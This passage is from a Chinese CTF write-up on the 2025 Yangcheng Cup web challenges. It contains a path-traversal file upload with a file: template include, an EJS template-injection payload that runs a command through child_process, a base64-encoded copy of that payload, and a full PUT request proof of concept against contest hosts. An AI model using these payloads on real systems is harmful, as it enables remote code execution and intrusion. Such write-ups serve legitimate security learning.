+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -F &quot;imgName=../../tmp/yui&quot; -F &quot;imgFile=@payload.html;type=text/html&quot; -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw&quot; -v http://45.40.247.139:23951/upload</span><br><span class="line"></span><br><span class="line">访问</span><br><span class="line">http://45.40.247.139:23951/login/dynamic-template?value=file:../../../../tmp/yui</span><br><span class="line"></span><br><span class="line">curl -H &quot;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSJ9.sFqXJja3YmLPT2ULrh0wnb-8HmGT13qSRUVs9-1rNCw&quot; http://45.40.247.139:23951/login/dynamic-template?value=file:../../../../tmp/yui</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419972.png" alt="image-20251012020520390"></p>
+<h3 id="staticNodeService"><a href="#staticNodeService" class="headerlink" title="staticNodeService"></a>staticNodeService</h3><p>根据题目得出满足</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    FILE *file;</span><br><span class="line">    <span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((c = fgetc(file)) != EOF) &#123;</span><br><span class="line">        <span class="built_in">putchar</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>才得flag、</p>
+<p>之后继续分析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419973.png" alt="image-20251012122433694"></p>
+<p>App.js可以看到两个重要参数：<strong>templ，req.body.content</strong></p>
+<p>templ的功能就是决定使用哪个EJS模板渲染页面，默认是index</p>
+<p>而content功能就是文件上传内容（base64编码）</p>
+<p>这里就想到了<em><strong>node.js</strong></em>注入</p>
+<p>相关参考</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/6780">Node.js 常见漏洞学习与总结-先知社区</a></p>
+<p>尝试node.js注入</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&lt;%- global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;/readflag&#x27;) %&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Base64编码绕</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPgo8L3VsPgo8aHI+CjwvYm9keT4KPC9odG1sPgo8L2h0bWw+</span><br></pre></td></tr></table></figure>
+
+<p>抓包在views下面传包，content注入别忘了将请求头改成PUT</p>
+<p>poc： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUT /views/jumao.ejs/. HTTP/1.1</span><br><span class="line">Host: 45.40.247.139:20306</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36 Core/1.116.554.400 QQBrowser/19.5.6663.400</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: Token=8004954b000000000000008c03617070948c04557365729493942981947d94288c026964944b028c08757365726e616d65948c056775657374948c0869735f61646d696e94898c096c6f676765645f696e948875622e</span><br><span class="line">Content-Type: application/json</span><br><span class="line">If-None-Match: W/&quot;273-if8cs80g9cADhHskk2Pvb4OoltU&quot;</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 754</span><br><span class="line"></span><br><span class="line">&#123;&quot;content&quot;:&quot;PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPCUtIGdsb2JhbC5wcm9jZXNzLm1haW5Nb2R1bGUucmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCcvcmVhZGZsYWcnKSAlPgo8L3VsPgo8aHI+CjwvYm9keT4KPC9odG1sPgo8L2h0bWw+&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419974.png" alt="image-20251012124048274"></p>
+<p>然后根据templ 传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://45.40.247.139:20306/?templ=jumao.ejs</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/CTF-USTB/Panic404-wp-images/images/20251012170419975.png" alt="image-20251012124155831"></p>
+<p style="text-align: right;"> by. Huaji </p> 
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://huajihd.github.io">Huaji</a>
+            <p>原文链接：<a href="http://huajihd.github.io/2025/10/14/ycb2025-web/">http://huajihd.github.io/2025/10/14/ycb2025-web/</a>
+            <p>发表日期：<a href="http://huajihd.github.io/2025/10/14/ycb2025-web/">October 14th 2025, 6:14:32 pm</a>
+            <p>更新日期：<a href="http://huajihd.github.io/2025/10/14/ycb2025-web/">October 15th 2025, 6:19:58 pm</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2025/11/09/Pikachu/" title="Pikachu">
+                    <div class="nextTitle">Pikachu</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2025/10/07/bugkuawd-10-7/" title="bugku-awd小记10.7">
+                    <div class="prevTitle">bugku-awd小记10.7</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:2185374541@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/HuajiHD" class="iconfont-archer github" target="_blank" title="github"></a>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BE%8A%E5%9F%8E%E6%9D%AF2025-Web"><span class="toc-number">1.</span> <span class="toc-text">羊城杯2025-Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-unserialize"><span class="toc-number">1.1.</span> <span class="toc-text">ez_unserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-blog"><span class="toc-number">1.2.</span> <span class="toc-text">ez-blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#authweb"><span class="toc-number">1.3.</span> <span class="toc-text">authweb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#staticNodeService"><span class="toc-number">1.4.</span> <span class="toc-text">staticNodeService</span></a></li></ol></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 21
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/hello-world/">Hello World</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/09</span>
+            <a class="archive-post-title" href="/2025/11/09/Pikachu/">Pikachu</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span>
+            <a class="archive-post-title" href="/2025/10/14/ycb2025-web/">羊城杯2025-web</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/07</span>
+            <a class="archive-post-title" href="/2025/10/07/bugkuawd-10-7/">bugku-awd小记10.7</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/11</span>
+            <a class="archive-post-title" href="/2025/08/11/fengshentai/">封神台2025</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week2/">NewStar CTF 2024 Web Week2复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/20</span>
+            <a class="archive-post-title" href="/2025/07/20/NewStar-CTF-2024-Web-Week3/">NewStar CTF 2024 Web Week3复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2025/07/18/NewStar-CTF-2024-Web-Week1/">NewStar CTF 2024 Web Week1复现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span>
+            <a class="archive-post-title" href="/2025/07/12/YWB2025-Final/">御网杯2025线下赛</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/06</span>
+            <a class="archive-post-title" href="/2025/07/06/BlitzCTF-WP/">BlitzCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/02</span>
+            <a class="archive-post-title" href="/2025/07/02/Junior-Crypt-2025/">Junior.Crypt.2025 CTF</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/18</span>
+            <a class="archive-post-title" href="/2025/05/18/ISCC-WP/">ISCC2025-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span>
+            <a class="archive-post-title" href="/2025/04/20/UCSC-WP/">UCSC-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2025/04/06/XYCTF-WP/">XYCTF-WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/16</span>
+            <a class="archive-post-title" href="/2025/02/16/EHAX-WP/">EHAX_WP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2025/01/27/TUCTF-WP/">TUCTF_WP</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/SQLByPass/">sql注入绕过技巧</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/25</span>
+            <a class="archive-post-title" href="/2024/12/25/vbsTestAutomation/">vbs自动化测试</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/06</span>
+            <a class="archive-post-title" href="/2024/12/06/ouc-rob-blue/">重生之我在牢山抢小蓝</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span>
+            <a class="archive-post-title" href="/2024/11/27/oucBookSeminar/">研讨室预约填写信息自动化工具</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/27</span>
+            <a class="archive-post-title" href="/2024/10/27/oucAutoCheckIn/">ouc接龙管家自动晚打卡</a>
+        </li>
+            </ul>
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+            <span class="sidebar-tag-name" data-tags="ctf">
+                <span class="iconfont-archer">&#xe606;</span>
+                ctf
+            </span>
+            <span class="sidebar-tag-name" data-tags="writeup">
+                <span class="iconfont-archer">&#xe606;</span>
+                writeup
+            </span>
+            <span class="sidebar-tag-name" data-tags="web">
+                <span class="iconfont-archer">&#xe606;</span>
+                web
+            </span>
+            <span class="sidebar-tag-name" data-tags="python">
+                <span class="iconfont-archer">&#xe606;</span>
+                python
+            </span>
+            <span class="sidebar-tag-name" data-tags="requests">
+                <span class="iconfont-archer">&#xe606;</span>
+                requests
+            </span>
+            <span class="sidebar-tag-name" data-tags="青龙面板">
+                <span class="iconfont-archer">&#xe606;</span>
+                青龙面板
+            </span>
+            <span class="sidebar-tag-name" data-tags="debian">
+                <span class="iconfont-archer">&#xe606;</span>
+                debian
+            </span>
+            <span class="sidebar-tag-name" data-tags="selenium">
+                <span class="iconfont-archer">&#xe606;</span>
+                selenium
+            </span>
+            <span class="sidebar-tag-name" data-tags="javascript">
+                <span class="iconfont-archer">&#xe606;</span>
+                javascript
+            </span>
+            <span class="sidebar-tag-name" data-tags="js">
+                <span class="iconfont-archer">&#xe606;</span>
+                js
+            </span>
+            <span class="sidebar-tag-name" data-tags="vbs">
+                <span class="iconfont-archer">&#xe606;</span>
+                vbs
+            </span>
+            <span class="sidebar-tag-name" data-tags="-web">
+                <span class="iconfont-archer">&#xe606;</span>
+                -web
+            </span>
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://huajihd.github.io",
+        root: siteMetaRoot,
+        author: "Huaji"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
+        <!-- algolia -->
+        <!-- busuanzi -->
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        <!-- async load share.js -->
+            <script src="/scripts/share.js" async></script>
+        <!-- mermaid -->
+    </body>
+</html>
